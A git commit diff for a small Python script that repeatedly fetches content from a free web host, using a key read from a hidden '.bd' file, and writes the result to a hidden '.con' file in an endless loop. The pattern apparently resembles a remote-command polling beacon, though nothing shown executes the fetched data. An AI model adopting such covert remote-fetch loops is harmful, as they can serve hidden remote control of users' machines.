c0dfe90158e6075e1255cab795e3573aa81914ad
oo-ozo <55140388+oo-ozo@users.noreply.github.com>
2020-11-18 14:19:37 +0630

    Update st.py

--- st.py
+++ st.py
@@ -1,9 +1,10 @@
 import requests
 import os
 
-bd = open('.bd', 'r')
-p = requests.get('https://dedeco.000webhostapp.com/'+bd.read())
-bd.close()
-f = open('.con', '+w')
-f.write(p.text)
-f.close()
+while True:
+  bd = open('.bd', 'r')
+  p = requests.get('https://dedeco.000webhostapp.com/'+bd.read())
+  bd.close()
+  f = open('.con', '+w')
+  f.write(p.text)
+  f.close()
